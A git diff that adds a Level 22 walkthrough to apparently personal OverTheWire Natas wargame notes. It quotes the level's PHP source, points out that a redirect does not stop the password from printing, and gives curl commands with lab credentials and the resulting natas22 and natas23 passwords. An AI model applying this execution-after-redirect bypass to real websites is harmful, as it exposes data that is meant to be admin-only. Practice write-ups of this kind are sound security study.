@@ -2163,8 +2163,6 @@ This explains why our first attempt fails: the `admin=1` value is stored, but in
 
 So if we want this to work, we need to make sure both applications use the **exact same session ID**.
 
----
-
 First, retrieve a session ID from `natas21-experimenter`:
 ```powershell
 curl.exe -i -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH "http://natas21-experimenter.natas.labs.overthewire.org/"
@@ -2213,6 +2211,117 @@ And the password for natas22 is `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`.
 - **Date**: 2026-04-05
 - **URL**: `http://natas22.natas.labs.overthewire.org`
 - **Password**: `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`
+- **Tools**: Web Browser, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+<?php
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Notice this bit:
+```php
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+```
+
+- If `revelio` is present in the URL query parameters, the page checks if we are an admin.
+- If we are not an admin, it redirects us to the homepage.
+
+But notice this too:
+```php
+if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+```
+
+The page prints the password if `revelio` is present in the URL query parameters, <u>without checking if we are an admin!</u>
+
+But because the page immediately redirects non-admins when `revelio` is present, we won't be able to see it.
+
+So we just need to use `?revelio=1` in the URL and <u>prevent the redirection</u> to see the password!
+
+`curl` does **not** follow redirects by default!
+```powershell
+curl.exe -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz -i http://natas22.natas.labs.overthewire.org/?revelio=1
+```
+
+This will show us the credentials for natas23 in the response:
+```html
+<div id="content">
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+And the password for natas23 is `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`.
+
+#### The Lesson
+
+Don’t rely on redirection to protect sensitive information — it doesn’t stop the code from running.
+
+### Level 23
+
+- **Date**: 2026-04-05
+- **URL**: `http://natas23.natas.labs.overthewire.org`
+- **Password**: `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`
 - **Tools**: Web Browser, `curl`
 
 #### The Solution
